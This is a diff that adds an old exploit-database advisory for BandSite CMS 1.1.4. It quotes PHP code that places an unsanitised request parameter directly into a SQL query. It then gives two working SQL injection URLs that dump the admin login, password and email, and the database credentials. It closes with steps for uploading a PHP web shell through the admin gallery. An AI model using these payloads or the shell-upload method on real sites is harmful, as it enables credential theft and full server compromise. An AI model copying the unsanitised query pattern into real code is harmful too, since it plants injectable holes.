@@ -1,0 +1,58 @@
+#########################################################################
+[+] BandSite CMS 1.1.4 (SQL/Upload Shell) Multiple Remote Vulnerabilites
+[+] Discovered By SirGod
+[+] www.mortal-team.org
+[+] www.h4cky0u.org
+#########################################################################
+
+[+] Remote SQL Injection
+
+ - The script is full of SQLI bugs.This is one of them.
+
+ - Vulnerable code in includes\content\member_content.php
+
+-----------------------------------------------------------------------------------------------------------------------------------
+	$memid = $_REQUEST['memid'];
+	
+	// define the query
+	// if the $memid variable is set, that means we're displaying a full bio and we should select the specific member entry
+	if(isset($memid)){
+		$query = "
+			SELECT
+				*
+			FROM
+				memberbios
+			WHERE
+				rec_id=$memid";
+	}
+-----------------------------------------------------------------------------------------------------------------------------------
+
+
+  PoC 1 :
+
+    http://127.0.0.1/members.php?memid=1 union all select 1,2,concat_ws(0x3a,admin_username,admin_password,admin_email),4,5,6,7 from config--
+
+  PoC 2 :
+
+    http://127.0.0.1/members.php?memid=1 union all select 1,2,concat_ws(0x3a,db_username,db_password,db_name,db_host),4,5,6,7 from config--
+
+
+[+] Upload Shell
+
+ - Need to be logged in as administrator.
+
+ Go to :
+
+    http://127.0.0.1/adminpanel/index.php?action=addphotos
+
+ Add the shell :
+
+    cmd.php
+
+ You will find your shell here :
+
+    http://127.0.0.1/images/gallery/cmd.php
+
+#########################################################################
+
+# milw0rm.com [2009-03-30]
